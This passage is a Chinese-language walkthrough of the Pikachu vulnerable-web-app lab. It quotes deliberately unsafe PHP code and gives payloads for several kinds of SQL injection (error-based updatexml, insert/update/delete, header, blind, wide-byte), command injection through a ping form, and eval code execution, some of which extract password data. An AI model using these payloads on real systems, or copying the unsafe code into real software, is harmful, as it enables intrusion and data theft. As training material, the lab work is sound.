数据 `a' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#`

![image](../../../img/渗透/实验/pikachu/44.png)

### xx型注入
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username=('$name')";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

**漏洞利用**

参照代码，这里使用字符型且没有使用相似查询，然而这个不重要，关键是构造一个闭合

payload: `' or '1' = '1 #`

### "insert/update"注入
insert 注入，就是前端注册的信息最终会被后台通过 insert 这个操作插入数据库，后台在接受前端的注册数据时没有做防 SQL 注入的处理，导致前端的输入可以直接拼接 SQL 到后端的 insert 相关内容中，导致了 insert 注入。

**服务器端核心代码**
```php
if(isset($_POST['submit'])){
    if($_POST['username']!=null &&$_POST['password']!=null){
//      $getdata=escape($link, $_POST);//转义

        //没转义,导致注入漏洞,操作类型为insert
        $getdata=$_POST;
        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1){
            $html.="<p>注册成功,请返回<a href='sqli_login.php'>登录</a></p>";
        }else {
            $html.="<p>注册失败,请检查下数据库是否还活着</p>";

        }
    }else{
        $html.="<p>必填项不能为空哦</p>";
    }
}
```

**漏洞利用**

在上面搜索型注入中演示了 select 类报错获取信息,insert 和 update 其实类似

先测 insert 注入，在注册页面输入 `'` ，来查看后端反馈的观察，通过观察报错了解到提交的内容在后台参与了拼接。

![image](../../../img/渗透/实验/pikachu/45.png)

版本 `1' or updatexml(1,concat(0x7e,(version())),0) or'')#`

表名 `1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0) or'')#`

![image](../../../img/渗透/实验/pikachu/46.png)

老规矩,改 limit 后的数字

字段名 `1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0) or'')#`

![image](../../../img/渗透/实验/pikachu/47.png)

老规矩,改 limit 后的数字

数据 `1' or updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) or'')#`

![image](../../../img/渗透/实验/pikachu/48.png)

数据 `1' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or'')#`

![image](../../../img/渗透/实验/pikachu/49.png)

下面测试 update

**服务器端核心代码**
```php
if(isset($_POST['submit'])){
    if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
//        $getdata=escape($link, $_POST);

        //未转义,形成注入,sql操作类型为update
        $getdata=$_POST;
        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['sqli']['username']}'";
        $result=execute($link, $query);
        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
            header("location:sqli_mem.php");
        }else {
            $html1.='修改失败，请重试';

        }
    }
}
```

**漏洞利用**

版本 `1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = <注意！！！这里是你的用户名>;#`

例如我的: `1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = 123;#`

![image](../../../img/渗透/实验/pikachu/50.png)

![image](../../../img/渗透/实验/pikachu/51.png)

后面爆剩下的略，累了

### "delete"注入
**服务器端核心代码**
```php
// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
//没对传进来的id进行处理，导致DEL注入
if(array_key_exists('id', $_GET)){
    $query="delete from message where id={$_GET['id']}";
    $result=execute($link, $query);
    if(mysqli_affected_rows($link)==1){
        header("location:sqli_del.php");
    }else{
        $html.="<p style='color: red'>删除失败,检查下数据库是不是挂了</p>";
    }
}
```

**漏洞利用**

抓包 `GET /pikachu/vul/sqli/sqli_del.php?id=1 HTTP/1.1`

参数 id 可以尝试 sql 报错注入，构造 payload

`1 or updatexml(1,concat(Ox7e,database()),0)`

通过Burp Suite中自带的URL转换编码来转换替换ID

![image](../../../img/渗透/实验/pikachu/53.png)

![image](../../../img/渗透/实验/pikachu/52.png)

后面略

### "http header"注入
**服务器端核心代码**
```php
if(isset($_GET['logout']) && $_GET['logout'] == 1){
    setcookie('ant[uname]','',time()-3600);
    setcookie('ant[pw]','',time()-3600);
    header("location:sqli_header_login.php");
}
?>
```

**漏洞利用**

![image](../../../img/渗透/实验/pikachu/54.png)

登陆后去 Burp 中找到登陆的 GET 请求，把请求发送到 Repeater 模块中，去除 User-Agent：，然后输入 `'`s 然后运行后观察 MYSQL 语法报错然后发现存在 SQL 注入漏洞。

![image](../../../img/渗透/实验/pikachu/55.png)

爆库名 payload: `firefox' or updatexml(1,concat(0x7e,database ()),0) or '`

![image](../../../img/渗透/实验/pikachu/56.png)

后面略

### 盲注(base on boolian)
盲注就是在 sql 注入过程中，sql 语句执行的选择后，报错的数据不能回显到前端页面（后台使用了错误消息屏蔽方法屏蔽了报错）。在无法通过返回的信息进行 sql 注入时，采用一些方法来判断表名长度、列名长度等数据后来爆破出数据库数据的的这个过程称为盲注。

**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //mysqi_query不打印错误描述,即使存在注入,也不好判断
    $result=mysqli_query($link, $query);//
//     $result=execute($link, $query);
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

**漏洞利用**

基于 boolean 盲注主要表现：
```
1. 没有报错信息
2. 不管是正确的输入,还是错误的输入,都只显示两种情况(我们可以认为是0或者1)
3. 在正确的输入下,输入 and 1=1/and 1=2 发现可以判断
```
手工盲注的步骤
```
1.判断是否存在注入，注入是字符型还是数字型
2.猜解当前数据库名
3.猜解数据库中的表名
4.猜解表中的字段名
5.猜解数据
```

`注: 这里 123 是我创建的用户，可能原来是 admin，自己查一下数据库里的数据`

payload: `123' and 1=1 #` 有结果返回说明是字符型

payload: `123' and length(database())=7 #` 有结果，库名字7个字符

后面就是正常的盲注爆库步骤了，略

### 盲注(base on time)
**服务器端核心代码**
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述
//     $result=execute($link, $query);
//    $html.="<p class='notice'>i don't care who you are!</p>";
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断
            $html.="<p class='notice'>i don't care who you are!</p>";
        }
    }else{

        $html.="<p class='notice'>i don't care who you are!</p>";
    }
}
```

**漏洞利用**

源码里注释说的很清楚了，不管输入的是啥，返回的都是一样的。但就算没有不同的返回值，也是存在不同的返回情况的，因为查询语句是一定会被执行的。能通过控制返回的时间来判断查询是否存在

`123' and if(length(database())=7,sleep(5),1) #` 明显延迟，说明数据库名的长度为5个字符；

后面的步骤按部就班，略

### 宽字节注入
**服务器端核心代码**
```php
if(isset($_POST['submit']) && $_POST['name']!=null){

    $name = escape($link,$_POST['name']);
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题
    $set = "set character_set_client=gbk";
    execute($link,$set);

    //mysqi_query不打印错误描述
    $result=mysqli_query($link, $query);
    if(mysqli_num_rows($result) >= 1){
        while ($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```

**漏洞利用**

id 的参数传入代码层，就会在 `’` 前加一个 `\`，由于采用的 URL 编码，所以产生的效果是
`%df%5c%27`

关键就在这，`%df` 会吃掉 `%5c`，形成一个新的字节,举个例子就是 `%d5` 遇到 `%5c` 会把 `%5c` 吃掉，形成 `%d5%5c` ，这个编码经过代码解码后会形成一个汉字 `"誠"`

因为 `%df` 的关系，`\` 的编码 `%5c` 被吃掉了，也就失去了转义的效果，直接被带入到 mysql 中，然 后mysql 在解读时无视了 `%a0%5c` 形成的新字节，那么单引号便重新发挥了效果

![image](../../../img/渗透/实验/pikachu/57.png) 这作者写提示就 TM 玩似的，太不友好了

- 测试payload: `lili%df' or 1=1 #`
- 测试payload: `lili%df%27%20or%201=1%23`

- 爆库payload: `lili%df' union select user(),database() #`

- 爆表payload: `lili%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`

![image](../../../img/渗透/实验/pikachu/58.png)

- 后面略

---

## RCE
RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。
一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口

比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上

一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器

### exec "ping"
**服务器端核心代码**
```php
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
//     $check=explode('.', $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
    if(stristr(php_uname('s'), 'windows')){
//         var_dump(php_uname('s'));
        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }
}
```

**漏洞利用**

可以拼接想要执行的命令
- payload: `127.0.0.1 && ipconfig`
- payload: `127.0.0.1 & ipconfig`
- payload: `127.0.0.1 | ipconfig`

![image](../../../img/渗透/实验/pikachu/24.png)

### exec "eval"
**服务器端核心代码**
```php
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";
    }
}
```

- **eval(phpcode)**

    eval() 函数把字符串按照 PHP 代码来计算。

    该字符串必须是合法的 PHP 代码，且必须以分号结尾。

    如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。

**漏洞利用**

如果后台对输入没有处理，那么我们输入一个php代码：`phpinfo();` ,就会直接执行代码而不是返回正确的窗口

![image](../../../img/渗透/实验/pikachu/25.png)

---

## File Inclusion
文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：
- include(),include_once()
- require(),require_once()

大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：
1. 本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。
2. 远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。

因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。








---

## Unsafe Filedownload

---

## Unsafe Fileupload

---

## Over Permission

---

## ../../目录遍历

---

## 敏感信息泄露

---

## PHP反序列化

---

## XXE

---

## URL重定向

---

## SSRF



